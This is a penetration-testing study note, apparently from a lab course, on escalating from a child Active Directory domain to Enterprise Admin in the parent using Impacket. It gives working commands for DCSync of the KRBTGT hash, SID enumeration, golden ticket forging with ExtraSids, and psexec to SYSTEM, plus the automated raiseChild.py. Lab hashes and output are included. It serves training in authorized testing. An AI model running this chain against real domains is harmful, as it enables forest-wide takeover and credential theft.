> ⚠️ Same ExtraSids/Golden Ticket concept as the Windows version, using Impacket instead of Mimikatz/Rubeus. Be cautious with "autopwn" tools like `raiseChild.py` in client environments — understand the manual process so you can troubleshoot and explain exactly what happened.

---

## Required Data (Same as Windows Version)

1. KRBTGT hash for the **child domain**
2. SID of the **child domain**
3. Name of a target user in the child domain (**doesn't need to exist**)
4. FQDN of the child domain
5. SID of the **Enterprise Admins** group (root/parent domain)

---

## 1. Get the Child Domain's KRBTGT Hash — `secretsdump.py`

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

Requires DCSync-capable creds for an admin in the child domain.

---

## 2. Get the Child Domain's SID — `lookupsid.py`

Brute-forces SIDs/RIDs against the child DC:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

```
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
1001: LOGISTICS\lab_adm (SidTypeUser)
...
```

Filter for just the SID:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

> Individual object SIDs = `DOMAIN_SID-RID` (e.g., `lab_adm` = `S-1-5-21-2806153819-209893948-922872689-1001`)

---

## 3. Get the Enterprise Admins Group SID (Parent Domain)

Re-run against the **parent** DC instead:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

```
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

→ Enterprise Admins SID = `S-1-5-21-3842939050-3880317879-2865463114-519`

> Reference: well-known SIDs/RIDs list is useful here (e.g., RID 519 = Enterprise Admins, 512 = Domain Admins).

---

## Data Collected (Example)

|Field|Value|
|---|---|
|KRBTGT hash (child)|`9d765b482771505cbe97411065964d5f`|
|Child domain SID|`S-1-5-21-2806153819-209893948-922872689`|
|Target user (fake OK)|`hacker`|
|Child domain FQDN|`LOGISTICS.INLANEFREIGHT.LOCAL`|
|Enterprise Admins SID|`S-1-5-21-3842939050-3880317879-2865463114-519`|

---

## 4. Forge the Golden Ticket — `ticketer.py`

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
```

- `-domain-sid` → child domain (ticket's home domain)
- `-extra-sid` → parent domain's Enterprise Admins SID (grants forest-wide rights)
- Saves ticket to `hacker.ccache`

### Load the Ticket

```bash
export KRB5CCNAME=hacker.ccache
```

---

## 5. Use the Ticket — `psexec.py`

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

```
[*] Found writable share ADMIN$
[*] Opening SVCManager on 172.16.5.5.....
C:\Windows\system32> whoami
nt authority\system
```

> `-k -no-pass` tells Impacket to use the Kerberos ticket from `KRB5CCNAME` instead of a password.

---

## 6. Automated Alternative — `raiseChild.py`

Automates the **entire** child→parent escalation chain in one command:

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

### What It Does (Internally)

1. Finds the child domain controller (via MS-NRPC)
2. Finds the forest FQDN (via MS-NRPC)
3. Retrieves the forest's Enterprise Admin SID (via MS-LSAT)
4. Retrieves the child domain's KRBTGT credentials (via MS-DRSR / DCSync)
5. Builds a Golden Ticket, injecting the Enterprise Admin SID into the PAC's `ExtraSids`
6. Uses the ticket to authenticate to the forest and pull target user creds (Administrator by default)
7. Optionally saves the ticket to a ccache file (`-w`)
8. Optionally PSExecs to a target host with Enterprise Admin rights (`-target-exec`)

### Output

```
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
INLANEFREIGHT.LOCAL/administrator:500:...:88ad09182de639ccc6579eb0849751cf:::
C:\Windows\system32>whoami
nt authority\system
```

---

## Summary

| Step      | Tool                              | Purpose                                                      |
| --------- | --------------------------------- | ------------------------------------------------------------ |
| 1         | `secretsdump.py`                  | DCSync child domain's KRBTGT hash                            |
| 2         | `lookupsid.py` (child DC)         | Get child domain SID                                         |
| 3         | `lookupsid.py` (parent DC)        | Get Enterprise Admins SID                                    |
| 4         | `ticketer.py`                     | Forge Golden Ticket w/ ExtraSid                              |
| 5         | `export KRB5CCNAME` + `psexec.py` | Use ticket to get SYSTEM on parent DC                        |
| Automated | `raiseChild.py`                   | Runs steps 1–5 automatically, given child domain admin creds |

## Key Takeaways

- Same underlying flaw as the Windows version: **SID Filtering doesn't apply within a forest**.
- `ticketer.py`'s `-domain-sid` + `-extra-sid` flags map directly to Mimikatz's `/sid` + `/sids`.
- **Manual method > autopwn** for client engagements — understand each step so you can troubleshoot and accurately report what happened. Avoid blindly running "autopwn" tools (`raiseChild.py` or BloodHound-driven auto-exploit chains) in production environments.
- Only remediation: reset the child domain's **KRBTGT password twice**.

## Up Next

- Cross-forest trust abuse techniques (bidirectional forest trusts) — covered in more depth in later modules